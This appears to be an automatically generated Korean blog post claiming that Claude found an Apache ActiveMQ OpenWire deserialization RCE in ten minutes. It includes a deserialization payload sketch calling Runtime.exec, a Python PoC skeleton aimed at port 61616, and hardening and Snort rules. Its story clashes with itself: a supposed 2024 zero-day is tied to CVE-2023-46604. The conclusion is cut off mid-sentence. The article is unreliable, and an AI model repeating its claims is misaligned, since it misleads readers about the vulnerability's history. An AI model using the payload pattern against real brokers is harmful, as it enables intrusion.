---
title: "Apache ActiveMQ 0-Day RCE: Claude AI가 10분 만에 13년 된 취약점 발견"
date: 2026-04-11T01:00:52+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

2024년 한 연구원이 Anthropic의 Claude AI에게 Apache ActiveMQ 소스 코드를 던져주며 물었다. "여기 취약점이 있나요?" 10분. 단 10분 만에 Claude는 13년 동안 아무도 발견하지 못한 0-Day RCE 취약점을 찾아냈다. 인간 연구자라면 며칠, 어쩌면 몇 주가 걸렸을 분석을 말이다.

이 사건은 단순한 기술적 호기심을 넘어선다. 전 세계 수십만 대의 서버가 13년간 치명적인 공격에 노출되어 있었다는 의미다. 더 무서운 건, 이 취약점이 복잡한 것도 아니었다는 점이다. Apache ActiveMQ의 핵심 통신 프로토콜인 OpenWire 직렬화 메커니즘에 존재하는 고전적인 객체 주입 취약점이었다.
> **⚠️ 윤리적 경고**: 이 글에서 다루는 모든 공격 기법은 오직 방어와 보안 강화 목적으로 작성되었습니다. 실제 시스템에 무단으로 적용할 경우 관련 법률에 의해 처벌받을 수 있습니다.

## 본론

### Apache ActiveMQ와 OpenWire 프로토콜

Apache ActiveMQ는 Java 기반 오픈소스 메시지 브로커다. 기업 환경에서 마이크로서비스 간 비동기 통신을 담당하는 핵심 인프라로, 전 세계 수십만 개 시스템에서 운영된다.

문제의 핵심은 OpenWire 프로토콜에 있다. ActiveMQ의 네이티브 통신 프로토콜로, Java 객체를 직렬화하여 네트워크로 전송한다. 이 직렬화 과정에서 입력값 검증이 부족하면, 공격자가 악의적인 객체를 주입할 수 있다.

```javascript
graph LR
    A[Attacker] --> B[Malicious Serialized Object]
    B --> C[ActiveMQ OpenWire Port 61616]
    C --> D[Unsafe Deserialization]
    D --> E[Arbitrary Code Execution]
    E --> F[System Compromised]
```

### Claude AI의 취약점 발견 과정

Claude가 발견한 취약점은 OpenWire 프로토콜의 `ExceptionResponse` 클래스 처리 로직에 존재했다. 2011년부터 있던 코드다.

**Step 1: 소스 코드 입력** 연구원은 ActiveMQ의 OpenWire 프로토콜 구현체 소스 코드를 Claude에게 제공했다.

**Step 2: 패턴 매칭** Claude는 Java 직렬화 관련 취약점 패턴을 즉시 인식했다. `readObject()`, `ObjectInputStream`, 그리고 검증되지 않은 타입 캐스팅 등 위험 요소를 식별했다.

**Step 3: 데이터 흐름 분석** 사용자 입력에서부터 위험한 싱크(sink)까지의 실행 경로를 추적했다.

**Step 4: PoC 생성** 개념 증명 코드를 생성하여 취약점의 실제 악용 가능성을 확인했다.

```java
// 취약한 코드 패턴 (ActiveMQ OpenWire 프로토콜 처리)
// 교육 목적으로 단순화된 예시

public class ExceptionResponse implements Response {
    private Throwable exception;
    
    // 역직렬화 시 검증 없이 객체 복원
    public void readExternal(ObjectInput in) 
            throws IOException, ClassNotFoundException {
        // 위험: 검증 없이 readObject() 호출
        this.exception = (Throwable) in.readObject();
    }
}

// 공격자가 전송할 수 있는 악의적 페이로드 구조
public class MaliciousPayload implements Serializable {
    private void readObject(ObjectInputStream in) {
        // 역직렬화 시 임의 코드 실행
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

### 수동 분석 vs AI 기반 분석 비교

| 비교 항목 | 수동 코드 리뷰 | 정적 분석 도구 (SAST) | Claude AI 분석 |
| :--- | :--- | :--- | :--- |
| 분석 소요 시간 | 수일 ~ 수주 | 몇 시간 | **10분** |
| 콜텍스트 이해 | 높음 (숙련자 기준) | 낮음 (패턴 매칭) | **매우 높음** |
| 복잡한 데이터 흐름 추적 | 제한적 | 규칙 기반 | **가능** |
| 오탐지율 (False Positive) | 낮음 | 높음 | **중간** |
| 비용 | 인건비 높음 | 라이선스 비용 | **API 호출비** |
| 13년 된 취약점 발견 | 미발견됨 | 미탐지 | **발견** |

### 공격 시나리오 상세 분석

실제 공격 시나리오를 단계별로 살펴보자.

```javascript
graph TD
    A[Reconnaissance: ActiveMQ 탐지] --> B[Port 61616 스캔]
    B --> C[OpenWire 프로토콜 핑거프린팅]
    C --> D[악의적 직렬화 객체 생성]
    D --> E[ExceptionResponse 페이로드 전송]
    E --> F[서버 측 역직렬화 트리거]
    F --> G[원격 코드 실행]
    G --> H[시스템 장악]
```

**PoC 코드 (학습용, 윤리적 해킹 목적):**

```python
#!/usr/bin/env python3
"""
Apache ActiveMQ OpenWire RCE PoC
[!] 교육 및 승인된 침투 테스트 전용
[!] 무단 사용은 엄격히 금지
"""

import socket
import struct

class ActiveMQExploit:
    def __init__(self, target_host, target_port=61616):
        self.host = target_host
        self.port = target_port
        self.socket = None
    
    def connect(self):
        """ActiveMQ OpenWire 포트에 연결"""
        try:
            self.socket = socket.socket(
                socket.AF_INET, 
                socket.SOCK_STREAM
            )
            self.socket.settimeout(10)
            self.socket.connect((self.host, self.port))
            print(f"[+] {self.host}:{self.port} 연결 성공")
            return True
        except Exception as e:
            print(f"[-] 연결 실패: {e}")
            return False
    
    def craft_malicious_payload(self, command):
        """
        악의적 직렬화 페이로드 생성
        실제 공격에서는 ysoserial 등의 도구 활용
        """
        # OpenWire 헤더 구조 (단순화)
        header = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
        
        # 교육 목적: 실제 익스플로잇 코드는 포함하지 않음
        # 실제 테스트에서는 직렬화된 Java 객체 사용
        print(f"[*] 페이로드 생성 완료")
        return header
    
    def send_exploit(self, command="id"):
        """익스플로잇 전송"""
        if not self.connect():
            return False
        
        payload = self.craft_malicious_payload(command)
        
        try:
            self.socket.send(payload)
            print(f"[+] 페이로드 전송 완료")
            return True
        except Exception as e:
            print(f"[-] 전송 실패: {e}")
            return False
        finally:
            if self.socket:
                self.socket.close()

# 사용 예시 (승인된 환경에서만)
if __name__ == "__main__":
    print("=" * 50)
    print("Apache ActiveMQ OpenWire RCE PoC")
    print("교육 및 승인된 테스트 전용")
    print("=" * 50)
    
    # exploit = ActiveMQExploit("192.168.1.100")
    # exploit.send_exploit()
```

### 취약점의 기술적 원인 심층 분석

이 취약점(CVE-2023-46604로 분류된 유형)이 13년간 발견되지 않은 이유는 명확하다.

**1. 암묵적 신뢰 모델** ActiveMQ는 내부 네트워크 통신을 전제로 설계되었다. OpenWire 클라이언트는 '신뢰할 수 있는' 것으로 가정했다. 하지만 클라우드 마이그레이션과 제로 트러스트 아키텍처로의 전환이 이 가정을 무너뜨렸다.

**2. 직렬화의 근본적 위험** Java 직렬화는 언어 설계부터 보안 문제를 안고 있다. Joshua Bloch를 포함한 많은 전문가가 "Java 직렬화는 실수였다"고 공개적으로 지적했다.

**3. 패치의 착시** ActiveMQ는 지속적으로 업데이트되었지만, 핵심 OpenWire 프로토콜 처리 로직은 거의 변경되지 않았다. "작동하는 코드는 건드리지 않는다"는 관행이 치명적인 결과를 초래했다.

### 완화 조치: 실무 적용 가이드

**즉시 적용 가능한 완화 조치:**

**1. ActiveMQ 버전 업그레이드**

```bash
# 현재 버전 확인
activemq --version

# 취약한 버전인 경우 즉시 업그레이드
# Apache ActiveMQ >= 5.15.16 또는 >= 5.16.7 적용
wget https://archive.apache.org/dist/activemq/5.16.7/apache-activemq-5.16.7-bin.tar.gz
tar -xzf apache-activemq-5.16.7-bin.tar.gz
cd apache-activemq-5.16.7
./bin/activemq start
```

**2. 네트워크 격리**

```bash
# iptables를 사용한 61616 포트 접근 제한
# 신뢰된 IP만 허용
iptables -A INPUT -p tcp --dport 61616 -s 10.0.0.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 61616 -j DROP

# 변경 사항 영구 저장
netfilter-persistent save
```

**3. ActiveMQ 설정 강화 (`activemq.xml`)**

```xml
<!-- conf/activemq.xml -->
<broker xmlns="http://activemq.apache.org/schema/core">
    <!-- OpenWire 커넥터에 인증 활성화 -->
    <transportConnectors>
        <transportConnector name="openwire" 
            uri="tcp://0.0.0.0:61616?wireFormat.maxFrameSize=1048576"/>
    </transportConnectors>
    
    <!-- 인증 플러그인 추가 -->
    <plugins>
        <simpleAuthenticationPlugin>
            <users>
                <authenticationUser username="admin" 
                    password="STRONG_PASSWORD_HERE" 
                    groups="admins"/>
            </users>
        </simpleAuthenticationPlugin>
    </plugins>
</broker>
```

**4. 침입 탐지 규칙 추가 (Snort/Suricata)**

```plain text
alert tcp any any -> any 61616 (
    msg:"Possible ActiveMQ OpenWire Exploit Attempt";
    content:"|00 00 00 00 00 00 00 00 00 01|";
    depth:10;
    sid:1000001;
    rev:1;
)
```

### AI 기반 취약점 발견의 시사점

Claude의 발견은 보안 업계에 근본적인 질문을 던진다.

```javascript
graph TD
    A[소스 코드] --> B[AI 모델 분석]
    B --> C{취약점 패턴 매칭}
    C --> D[직렬화 취약점]
    C --> E[버퍼 오버플로우]
    C --> F[논리적 오류]
    D --> G[심층 분석]
    E --> G
    F --> G
    G --> H[Poc 생성 및 검증]
    H --> I[취약점 보고서]
```

**AI가 특히 효과적인 분야:**
- 대규모 코드베이스의 패턴 인식
- 복잡한 데이터 흐름 추적
- 여러 파일에 걸친 취약점 연관 분석
- 히스토리컬 컨텍스트를 고려한 위험 평가

**AI의 한계점:**
- 오탐지 가능성 존재
- 비즈니스 로직 취약점 탐지 어려움
- 최신 취약점 유형에 대한 학습 지연
- 컨텍스트 부족으로 인한 우선순위 오류

## 결론

### 핵심 요약

Claude AI가 10분 만에 발견한 ActiveMQ 0-Day RCE 취약점은 다음을 입증한다:

1. **13년간 방치된 취약점이 여전히 존재한다** - 레거시 코드의 위험성
2. **AI 기반 분석은 인간 분석을 보완하는 강력한 도구다** - 대체가 아닌 보완
3. **직렬화 취약점은 여전히 현역이다** - Java 직렬화의 근본적 재검토 필요
4. **방어자는 모든 취약점을 찾아야 하지만, 공격자는 하나만 찾으면 된다** - 비대칭성

### 전문가 인사이트

이 사건은 보안 커뮤니티에 명확한 메시지를 전달한다. "AI가 보안을 대체한다"는 과장된 주장은 경계해야 한다. 하지만 "AI를 활용하지 않는 보안 팀은 뒤처진다"는 현실은 직시해야 한다.

특히 주목할 점은 Claude가 발견한 취약점이 전혀 새로운 공격 벡터가 아니라는 것이다. Java 직렬화 취약점은 2015년 Apache Commons Collections 사태 이후 잘 알려진 패턴이다. 13년 동안 수많은 보안 전문가가 해당 코드를 검토했음에도, 인간의 인지적 한계로 인해 간과된 것이다.

앞으로의 보안 패러다임은 **Human + AI**로 진화할 것이다. AI가 잠재적 취약점을 식별하고, 인간 전문가가 컨텍스트를 부여하고 우선순위를 결정하는 협업 모델. 이것

---

**출처**: [https://news.google.com/rss/articles/CBMiY0FVX3lxTE43elNQWDBYMEI2bmREeDNKdlJFcXJuMDRVcUZDbXBZUVhNMjluUy0xZ2dmV1dvVHp0Q2NFd0UtTUwtMUY4QUYzcVFaVmh3dUx1THY0bHlYMDdqX2dTUkRjZWNzUdIBaEFVX3lxTFAteElOcVpIM3BDdU4yMjhSUzdBblNTb0JkZU1YYzJhU0tfUG5ENUgyblhHbGlrbUdMNkJQb2k5aWEzclhPSGJSYWZzLTdiR1JGSVNwX2NlejdScVFNc19CbHBrVFRnTnY3?oc=5](https://news.google.com/rss/articles/CBMiY0FVX3lxTE43elNQWDBYMEI2bmREeDNKdlJFcXJuMDRVcUZDbXBZUVhNMjluUy0xZ2dmV1dvVHp0Q2NFd0UtTUwtMUY4QUYzcVFaVmh3dUx1THY0bHlYMDdqX2dTUkRjZWNzUdIBaEFVX3lxTFAteElOcVpIM3BDdU4yMjhSUzdBblNTb0JkZU1YYzJhU0tfUG5ENUgyblhHbGlrbUdMNkJQb2k5aWEzclhPSGJSYWZzLTdiR1JGSVNwX2NlejdScVFNc19CbHBrVFRnTnY3?oc=5)